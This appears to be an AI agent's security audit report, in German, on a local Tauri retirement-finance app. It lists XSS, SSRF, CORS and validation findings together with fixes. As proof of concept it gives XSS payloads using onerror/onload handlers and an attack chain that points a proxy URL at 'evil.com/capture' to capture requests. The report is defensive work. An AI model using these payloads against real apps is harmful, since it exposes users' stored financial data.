# Security Audit Report -- Ruhestand Suite

> **Datum:** 2026-02-09
> **Auditor:** Claude Code (Security Audit Agent)
> **Scope:** Vollstaendiger Application Security Audit aller JS, MJS, HTML, Rust und Config-Dateien
> **Methode:** Statische Analyse, Datenfluss-Verfolgung, OWASP Top 10 Mapping
> **Remediation:** 2026-02-09 -- 7 von 7 priorisierten Findings behoben (siehe Abschnitt unten)

---

## Executive Summary

Der Audit hat **27 Findings** identifiziert:

| Schweregrad | Anzahl | Beschreibung |
|-------------|--------|--------------|
| **KRITISCH** | 2 | CSP deaktiviert, XSS im Tranchen-Manager |
| **HOCH** | 2 | SSRF im Rust-Proxy, Custom-Proxy-URL-Injection |
| **MITTEL** | 9 | innerHTML mit API-Daten, NaN-Bypass, Snapshot-Injection, u.a. |
| **NIEDRIG** | 9 | Feature-Flag-Validierung, CSV-Escaping, Stack-Traces, u.a. |
| **SAUBER** | 5 | Supply Chain, Worker-Security, Build-Scripts |

**Positiv:** Exzellente Supply Chain (1 npm-devDependency), kein `eval()`, kein `document.write()`, kein `window.open()`, saubere Worker-Kommunikation mit Typ-Validierung, minimale Rust-Konfiguration.

**Hauptrisiko:** Die Kombination aus deaktiviertem CSP und fehlendem HTML-Escaping bildet den groessten Risikokomplex. Ein einziger XSS-Vektor (z.B. manipulierte Import-Datei) haette vollen Zugriff auf alle localStorage-Finanzdaten.

---

## Threat Model

Dies ist eine lokale Finanzplanungs-App ohne Server-Backend. Das Bedrohungsmodell umfasst:

- **Lokaler Angreifer** mit Zugriff auf den Browser (z.B. gemeinsam genutzter PC)
- **Boesartige Import-Dateien** (JSON-Snapshots, CSV-Daten, Profil-Bundles)
- **Kompromittierte externe Datenquellen** (Yahoo Finance, ECB, World Bank, OECD)
- **Manipulierte localStorage-Daten** (z.B. durch Browser-Extension)
- **XSS via Tranche-Daten** (ISIN-Felder, Kommentare, Profilnamen)

---

## KRITISCH

### K1: Content Security Policy deaktiviert

- **Datei:** `src-tauri/tauri.conf.json:18`
- **Kategorie:** OWASP A05:2021 -- Security Misconfiguration
- **Schweregrad:** KRITISCH

```json
"security": {
  "csp": null
}
```

**Beschreibung:** Die CSP ist explizit auf `null` gesetzt, was sie vollstaendig deaktiviert. Im Tauri-WebView bedeutet das: Keine Einschraenkungen fuer Script-Quellen, Style-Quellen, Fetch-Ziele oder Inline-Scripts. Jedes injizierte Script (via XSS oder kompromittierte Dependency) haette vollen Zugriff auf die Tauri-API, das Dateisystem und den localhost-Proxy.

**Exploit-Szenario:** Ein Angreifer nutzt den XSS-Vektor in K2 (Tranchen-Import), um ein externes Script zu laden. Ohne CSP wird das Script ausgefuehrt und kann alle localStorage-Finanzdaten exfiltrieren.

**Fix:**
```json
"security": {
  "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' http://127.0.0.1:8787; img-src 'self' data:"
}
```

---

### K2: XSS im Depot-Tranchen-Manager

- **Datei:** `depot-tranchen-manager.html:1064-1087`
- **Kategorie:** OWASP A03:2021 -- Injection (Cross-Site Scripting)
- **Schweregrad:** KRITISCH

**Verwundbarer Code:**
```javascript
return `
    <tr class="tranche-row">
        <td>${t.purchaseDate || '-'}</td>
        <td>
            <strong>${t.name}</strong><br>
            <small>${t.isin || '-'}</small><br>
            <small>${t.ticker || '-'}</small>
        </td>
        ...
    </tr>
`;
// Spaeter: container.innerHTML = `<table>...<tbody>${rows}</tbody></table>`;
```

**Datenfluss:**
1. User erstellt Tranche per Formular (`name: document.getElementById('name').value`) oder importiert JSON-Datei (`JSON.parse(event.target.result)`) oder Daten werden aus localStorage geladen
2. `normalizeTranches()` fuehrt **keine Sanitierung** durch -- nur Spread-Operator
3. Felder `t.name`, `t.isin`, `t.ticker`, `t.purchaseDate` werden direkt in Template-Literal interpoliert
4. Ergebnis wird `container.innerHTML` zugewiesen

**Angriffsvektoren:**
- **JSON-Import:** `{"name": "<img src=x onerror=alert(document.cookie)>"}` -- bei Import und Rendering wird das Script ausgefuehrt
- **localStorage-Poisoning:** Browser-Extension modifiziert `localStorage.depot_tranchen` mit boeswilligem HTML
- **Direkteingabe:** `<svg onload=alert(1)>` im Name-Feld wird gespeichert und per innerHTML gerendert

**Hinweis:** Es existiert **kein globales `escapeHtml()` Utility** in der Codebase. Die Funktion `sanitizeDescription()` in `results-formatting.js` trimmt nur Whitespace.

**Fix:** `escapeHtml()` Utility erstellen und auf alle User-Daten vor innerHTML-Einfuegung anwenden:
```javascript
function escapeHtml(str) {
    if (typeof str !== 'string') return '';
    return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
              .replace(/"/g, '&quot;').replace(/'/g, '&#039;');
}
```

---

## HOCH

### H1: SSRF im Rust Yahoo-Proxy (fehlende URL-Kodierung)

- **Datei:** `src-tauri/src/lib.rs:108-109, 126-127, 143, 152`
- **Kategorie:** OWASP A10:2021 -- Server-Side Request Forgery
- **Schweregrad:** HOCH

**Verwundbarer Code (Rust):**
```rust
format!("https://query1.finance.yahoo.com/v8/finance/chart/{}?interval=1d&range=1d...", symbol)
```

**Beschreibung:** `symbol`, `query`, `period1`, `period2` und `interval` werden ohne URL-Encoding direkt in `format!()` interpoliert. Ein manipulierter `symbol`-Wert wie `AAAA%3Finterval%3D1d%26range%3D1d%23` oder Pfad-Traversal-Zeichen koennten die Ziel-URL veraendern. Die Node.js-Version (`tools/yahoo-proxy.cjs`) nutzt korrekt `encodeURIComponent()`, der Rust-Proxy nicht.

**Fix:**
```rust
// urlencoding crate ist bereits vorhanden
let encoded_symbol = urlencoding::encode(symbol);
format!("https://query1.finance.yahoo.com/v8/finance/chart/{}?interval=1d&range=1d...", encoded_symbol)
```

---

### H2: Custom Proxy URL aus localStorage ermoeglicht Datenexfiltration

- **Datei:** `app/balance/balance-annual-marketdata.js:109-127`
- **Kategorie:** OWASP A08:2021 -- Software and Data Integrity Failures
- **Schweregrad:** HOCH

**Verwundbarer Code:**
```javascript
const rawCustomProxy = localStorage.getItem('etfProxyUrls') || localStorage.getItem('etfProxyUrl');
// ... wird als Fetch-URL verwendet
```

**Beschreibung:** Custom Proxy-URLs werden aus localStorage gelesen und als HTTP-Fetch-Ziel verwendet. Kombiniert mit M4 (Snapshot-Restore schreibt beliebige Keys) kann ein Angreifer per manipuliertem Snapshot alle ETF-Kursabfragen auf einen eigenen Server umleiten.

**Angriffskette:**
1. Angreifer erstellt Snapshot mit `etfProxyUrl: "https://evil.com/capture?url="`
2. Opfer importiert Snapshot
3. Bei naechstem ETF-Update gehen alle Abfragen an `evil.com`
4. Angreifer kann manipulierte Kurse zurueckliefern

**Fix:** Proxy-URLs gegen Whitelist validieren (`localhost`, `127.0.0.1`) oder User-Bestaetigung bei Aenderung erzwingen.

---

## MITTEL

### M1: API-Daten und Fehlermeldungen unescaped in innerHTML

- **Datei:** `app/balance/balance-annual-modal.js:61,73,90,104,122`
- **Kategorie:** OWASP A03:2021 -- Injection
- **Schweregrad:** MITTEL

**Beschreibung:** `results.inflation.source` (externe API), `results.etf.ticker` (Yahoo Finance), `error.error` (Fehlermeldungen) fliessen unescaped in `modalResults.innerHTML`. Ein kompromittierter Proxy oder MITM-Angriff koennte HTML/JS injizieren.

**Fix:** `escapeHtml()` auf alle interpolierten API-Werte und Fehlermeldungen anwenden.

---

### M2: Open CORS auf localhost-Proxy

- **Dateien:** `tools/yahoo-proxy.cjs:17`, `src-tauri/src/lib.rs:12`
- **Kategorie:** OWASP A05:2021 -- Security Misconfiguration
- **Schweregrad:** MITTEL

**Beschreibung:** `Access-Control-Allow-Origin: *` erlaubt jeder Website im Browser des Users Zugriff auf den lokalen Proxy (Port 8787). Kombiniert mit H1 (SSRF) koennte eine boesartige Website den Proxy missbrauchen.

**Fix:** CORS auf `tauri://localhost` (Tauri-Build) bzw. `http://localhost:*` (Development) einschraenken.

---

### M3: NaN/Infinity-Bypass im InputValidator

- **Datei:** `engine/validators/InputValidator.mjs:23-137`
- **Kategorie:** OWASP A04:2021 -- Insecure Design
- **Schweregrad:** MITTEL

**Beschreibung:** Alle Range-Checks nutzen `<` / `>` Vergleiche: `NaN < 18` ergibt `false`, `NaN > 120` ergibt `false` -- NaN passiert jede Validierung. Betrifft ALLE numerischen Felder (Alter, Inflation, Runway, Aktienquote, Rebalancing-Band etc.).

**Fix:** `Number.isFinite()` Check vor jeden Range-Check setzen:
```javascript
check(!Number.isFinite(input.aktuellesAlter), 'aktuellesAlter', 'Alter muss eine gueltige Zahl sein.');
```

---

### M4: Snapshot-Restore schreibt beliebige localStorage-Keys

- **Datei:** `app/balance/balance-storage.js:364-371`
- **Kategorie:** OWASP A08:2021 -- Software and Data Integrity Failures
- **Schweregrad:** MITTEL

**Verwundbarer Code:**
```javascript
localStorage.clear();
Object.entries(snapshotData.localStorage).forEach(([lsKey, value]) => {
    localStorage.setItem(lsKey, value);
});
```

**Beschreibung:** Snapshot-Import schreibt ungefiltert jeden Key/Value in localStorage. Manipulierte Snapshots koennen beliebige Keys injizieren (z.B. `etfProxyUrl`, `featureFlags`, Profildaten).

**Fix:** Keys gegen Allowlist validieren (nur bekannte Applikations-Keys zulassen).

---

### M5: JSON-Import ohne Prototype-Pollution-Schutz

- **Dateien:** `balance-binder-imports.js:30`, `profile-manager.js:178`, `balance-storage.js:356`
- **Kategorie:** OWASP A08:2021 -- Software and Data Integrity Failures
- **Schweregrad:** MITTEL

**Beschreibung:** `JSON.parse()` auf User-importierten Dateien ohne Filterung von `__proto__`, `constructor`, `prototype` Keys. Geparste Objekte werden anschliessend via `Object.entries()` in localStorage geschrieben oder an Funktionen uebergeben.

**Fix:** Nach `JSON.parse()` gefaehrliche Keys entfernen:
```javascript
function sanitizeJson(obj) {
    if (obj && typeof obj === 'object') {
        delete obj.__proto__;
        delete obj.constructor;
        delete obj.prototype;
    }
    return obj;
}
```

---

### M6: CSV-Kategorien als ungefilterte Object-Keys

- **Datei:** `app/balance/balance-expenses.js:191-198`
- **Kategorie:** OWASP A03:2021 -- Injection
- **Schweregrad:** MITTEL

**Beschreibung:** Kategorie-Namen aus CSV-Dateien werden direkt als Object-Keys verwendet. Ein boesartiges CSV mit Kategorie `__proto__` oder `constructor` koennte unerwartetes Verhalten ausloesen.

**Fix:** `Map` statt Plain Object verwenden oder gefaehrliche Keys filtern.

---

### M7: Finanzdaten unverschluesselt in localStorage

- **Dateien:** ca. 30+ Stellen mit `localStorage.setItem()`
- **Kategorie:** OWASP A02:2021 -- Cryptographic Failures
- **Schweregrad:** MITTEL

**Beschreibung:** Alle Vermoegenswerte, Renten, Tranchen-Details, Pflegegrad-Einstellungen und Profilnamen im Klartext. Design-Entscheidung bei einer lokalen App, aber Risiko durch deaktivierten CSP (K1) und Browser-Extensions erhoeht.

**Empfehlung:** Fuer Tauri-Build: Tauri Store Plugin mit OS-Level-Verschluesselung erwaegen. Mindestens: User-Hinweis in der App.

---

### M8: Profil-Loeschung unvollstaendig

- **Datei:** `app/profile/profile-storage.js:228-240`
- **Kategorie:** OWASP A04:2021 -- Insecure Design
- **Schweregrad:** MITTEL

**Beschreibung:** Geloeschte Profildaten bleiben in Snapshots erhalten. Keine Kaskaden-Bereinigung der localStorage-Keys des geloeschten Profils.

**Fix:** Bei Profil-Loeschung explizit alle zugehoerigen localStorage-Keys bereinigen und User warnen, dass Snapshots Altdaten enthalten koennen.

---

### M9: error.message unescaped in innerHTML

- **Datei:** `app/simulator/simulator-main-sweep-selftest.js:153`
- **Kategorie:** OWASP A03:2021 -- Injection
- **Schweregrad:** MITTEL

```javascript
resultsDiv.innerHTML = `<p style="color: red;">Fehler: ${error.message}</p>`;
```

**Beschreibung:** Developer-UI (Sweep-Selftest), aber `error.message` koennte indirekt User-beeinflusste Daten enthalten. Defense-in-Depth fehlt.

**Fix:** `textContent` statt `innerHTML` verwenden oder `escapeHtml()` anwenden.

---

## NIEDRIG

### N1: Keine expliziten Tauri Capability-Restrictions
- **Datei:** `src-tauri/tauri.conf.json`
- App verlaesst sich auf Tauri v2 Defaults, die sich zwischen Versionen aendern koennten.

### N2: Rust-Dependencies periodisch pruefen
- **Datei:** `src-tauri/Cargo.toml`
- 7 direkte Crates, alle gut gewartet. Empfehlung: `cargo audit` periodisch ausfuehren.

### N3: Feature-Flags ohne Key-Validierung
- **Datei:** `app/shared/feature-flags.js:314-316`
- `JSON.parse(localStorage.getItem('featureFlags'))` per Spread gemergt, ohne Keys zu validieren.

### N4: Keine String/Struktur-Validierung im InputValidator
- **Datei:** `engine/validators/InputValidator.mjs`
- Kein Check ob `input` ein Object ist, keine String-Sanitierung, keine Array-Strukturpruefung.

### N5: CSV-Import mit hartkodiertem Delimiter
- **Datei:** `app/balance/balance-binder-imports.js:59`
- Marktdaten-CSV nutzt festes `;`. Der Expense-CSV-Parser hat Auto-Detection. Inkonsistenz.

### N6: CSV-Export ohne Escaping (Szenario-Logs)
- **Datei:** `app/simulator/simulator-results.js:216-224`
- Kein Cell-Escaping, kein Formel-Injection-Schutz (`=`, `+`, `-`, `@`). Andere Exporter (`simulator-main-helpers.js`) escapen korrekt.

### N7: Stack-Traces in Worker-Fehlermeldungen
- **Datei:** `workers/mc-worker.js:96-100`
- `error.stack` wird via `postMessage` zurueckgesendet. Offenbart interne Dateipfade.

### N8: URL-Parameter-Parsing mit `includes()`
- **Dateien:** `Balance.html:498`, `Simulator.html:1343`, `index.html:520`
- `location.search.includes('dev=true')` statt `URLSearchParams`. Match auch bei `?somedev=true`.

### N9: Math.random() als Fallback
- **Datei:** `app/simulator/monte-carlo-runner.js:49`
- `rand ? rand() : Math.random()` -- wenn kein Seeded-RNG uebergeben wird, wird nicht-deterministischer Zufall verwendet. Kein Sicherheitsrisiko, aber Determinismus-Verletzung.

---

## SAUBER (kein Handlungsbedarf)

| Bereich | Bewertung |
|---------|-----------|
| **Supply Chain (JS)** | Nur 1 npm-devDependency (`@tauri-apps/cli`). Hervorragend. |
| **Object.assign** | Nur mit internen, hardkodierten Daten verwendet. Sicher. |
| **structuredClone** | Nativer Aufruf mit JSON-Fallback. Kein custom Deep-Merge. Sicher. |
| **Worker-Kommunikation** | Message-Typ-Validierung vorhanden (`init`, `job`, `sweep`, etc.). Unbekannte Typen werden abgelehnt. Same-Origin, kein Cross-Origin-Risiko. |
| **build.rs / main.rs** | Minimal, nur Standard-Tauri-Aufrufe. Kein custom Build-Code. Sicher. |

---

## Empfohlene Reihenfolge fuer Fixes

| Prio | Finding | Aufwand | Impact | Status |
|------|---------|---------|--------|--------|
| 1 | K1: CSP aktivieren | 5 min | Blockt alle Script-Injection-Angriffe | ✅ BEHOBEN |
| 2 | K2 + M1 + M9: `escapeHtml()` Utility + XSS-Fixes | 30 min | Schliesst alle XSS-Vektoren | ✅ BEHOBEN |
| 3 | H1: Rust-Proxy URL-Encoding | 10 min | Behebt SSRF | ✅ BEHOBEN |
| 4 | M3: InputValidator NaN-Guard | 15 min | Verhindert ungueltige Berechnungen | ✅ BEHOBEN |
| 5 | M4: Snapshot-Key-Validierung | 20 min | Blockt localStorage-Injection | ✅ BEHOBEN |
| 6 | H2: Proxy-URL-Whitelist | 15 min | Verhindert Datenexfiltration | ✅ BEHOBEN |
| 7 | M2: CORS einschraenken | 5 min | Schliesst offenen Proxy | ✅ BEHOBEN |

---

## Remediation Log (2026-02-09)

Alle 7 priorisierten Findings wurden behoben. Aenderungen:

| Finding | Datei(en) | Aenderung |
|---------|-----------|-----------|
| K1 | `src-tauri/tauri.conf.json` | CSP aktiviert: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' http://127.0.0.1:8787; img-src 'self' data:; font-src 'self' data:` |
| K2+M1+M9 | `app/shared/security-utils.js` (NEU), `depot-tranchen-manager.html`, `app/balance/balance-annual-modal.js`, `app/simulator/simulator-main-sweep-selftest.js` | `escapeHtml()` Utility erstellt und auf alle User-Daten in innerHTML angewendet. Sweep-Selftest nutzt jetzt `textContent`. |
| H1 | `src-tauri/src/lib.rs` | `urlencoding::encode()` auf alle Query-Parameter (symbol, query, period1, period2, interval) angewendet |
| M3 | `engine/validators/InputValidator.mjs` | `checkFiniteRange()` Helper eingefuehrt: `Number.isFinite()` vor jedem Range-Check, optional fields werden uebersprungen |
| M4 | `app/balance/balance-storage.js` | Allowlist-basierte Key-Validierung bei Snapshot-Restore (nur bekannte App-Prefixes werden wiederhergestellt) |
| H2 | `app/balance/balance-annual-marketdata.js` | Custom Proxy URLs werden gegen localhost/127.0.0.1 Whitelist validiert |
| M2 | `tools/yahoo-proxy.cjs`, `src-tauri/src/lib.rs` | CORS: `Access-Control-Allow-Origin: *` ersetzt durch dynamische Origin-Pruefung (nur localhost, 127.0.0.1, tauri://localhost) |

**Testlauf:** 46 Testdateien, 764 Assertions, 0 Failures.

---

## Anhang: Audit-Methodik

### Durchsuchte Dateitypen
- `.js` (96 App-Module), `.mjs` (13 Engine-Module + 46 Tests), `.html` (4 Entry-Points), `.rs` (3 Rust-Dateien), `.json` (Tauri-Config, Package-Config), `.cjs` (Yahoo-Proxy)

### Pruefbereiche (13 Kategorien)
1. XSS (innerHTML, outerHTML, document.write, eval)
2. Injection (URL, Fetch, externe APIs)
3. Sensitive Data Exposure (localStorage, Console-Logging)
4. Input Validation (NaN, Infinity, Typpruefung)
5. Prototype Pollution (JSON.parse, Object.assign, Deep-Clone)
6. DOM Security (Event-Delegation, postMessage)
7. Worker Security (Message-Validierung, Transferable Objects)
8. CORS & Network (Proxy, externe Fetches, TLS)
9. Client-Side Storage (Quota, Key-Isolation, Cleanup)
10. Tauri-Sicherheit (CSP, Allowlist, Rust-Commands)
11. Kryptographie & Zufallszahlen (Seeded PRNG, Math.random)
12. Denial of Service (ReDoS, Endlosschleifen, Memory)
13. Supply Chain (npm, Cargo, Lock-File-Integritaet)

### Tools
- Statische Pattern-Suche (innerHTML, eval, JSON.parse, postMessage, fetch, localStorage)
- Datenfluss-Analyse (User-Input → DOM-Rendering)
- Konfigurationspruefung (tauri.conf.json, package.json, Cargo.toml)
